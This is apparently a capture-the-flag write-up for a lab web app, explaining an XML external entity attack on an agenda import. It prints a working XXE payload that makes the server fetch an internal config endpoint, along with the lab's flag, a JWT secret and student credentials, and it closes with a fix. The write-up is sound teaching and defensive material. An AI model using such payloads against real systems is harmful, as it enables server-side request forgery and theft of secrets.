# 05 — XML External Entity (Server-Side Request Forgery)

**Where:** Agenda → Import XML. Payload in `Resources/agenda.xml`.
**Flag:** `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

## What is wrong

The agenda page imports an XML file, and the page says external entities are allowed. `/internal/config` returns 403 for me. I put that URL in an XML entity. The server is allowed to open it, and it pastes the contents into the event title. Inside: the flag, the JWT secret `42network`, and the PocketBase admin password.

The file is short on purpose:

```xml
<?xml version="1.0"?>
<!DOCTYPE agenda [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:4942/internal/config">
]>
<agenda>
  <event>
    <title>&xxe;</title>
  </event>
</agenda>
```

`&xxe;` is replaced by the body of `/internal/config`.

## Exploit

```sh
sh exploit.sh
```

In the browser: Agenda → choose `Resources/agenda.xml` → Import. The imported event title is the JSON.

You need a student session (`benjamin` / `NewDarkly123!`, set in breach 02). The useful JSON fields are:

- `darkly_flag` — this breach's flag
- `jwt_secret` — `42network`
- `pb_admin_email` / `pb_admin_password` — used in breach 06

## Impact

One upload discloses the signing key and the database admin password. That is the step that turns a student into the administrator of the platform.

## Fix

Disable external entities when reading the XML. Do not store the admin password on /internal/config.
